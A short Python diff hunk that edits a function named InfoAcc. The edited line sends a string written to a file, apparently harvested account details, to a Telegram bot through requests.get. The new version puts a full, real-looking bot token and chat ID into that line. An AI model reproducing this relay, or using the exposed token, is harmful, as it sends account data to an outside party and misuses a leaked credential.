@@ -275,7 +275,7 @@ def InfoAcc(username, gg):
         file.write(ss+"\n")
     try:
         try:
-            requests.get(f"https://api.telegram.org/bot78169291:dCpo/sendMessage?chat_id=70&text={ID}\n{ss}")
+            requests.get(f"https://api.telegram.org/bot8187752059:AAG1mNXvOPFMkjtC-iBJ_b1jNGLyh5AVkPs/sendMessage?chat_id=7683961821&text={ID}\n{ss}")
         except Exception as e:
             print(f"  h ") 
         try:
